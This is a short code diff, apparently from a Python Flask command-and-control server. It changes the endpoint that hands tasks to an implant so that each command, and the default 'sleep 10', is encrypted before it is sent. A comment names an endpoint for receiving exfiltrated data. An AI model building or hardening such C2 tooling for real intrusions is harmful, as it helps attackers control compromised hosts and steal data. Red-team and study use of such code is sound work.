@@ -26,7 +26,8 @@ def encrypt(plain_str):
     plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
     encrypted = cipher.encrypt(plaintext)
     print(f"[*] Encrypted Message: {encrypted})")
-    return encrypted + cipher.iv
+    res = encrypted + cipher.iv
+    return res.decode('latin-1')
 
 #Decryption of data 
 def decrypt(ciphertext): 
@@ -72,8 +73,8 @@ def assign_command(cmd_index):
 def get_task():
     if not tasks.empty():
         task = tasks.get()
-        return jsonify({"task": task})
-    return jsonify({"task": "sleep 10"})
+        return jsonify({"task": encrypt(task)})
+    return jsonify({"task": encrypt("sleep 10")})
 
 
 # Implant invokes this endpoint to send exfiltrated data back to the server
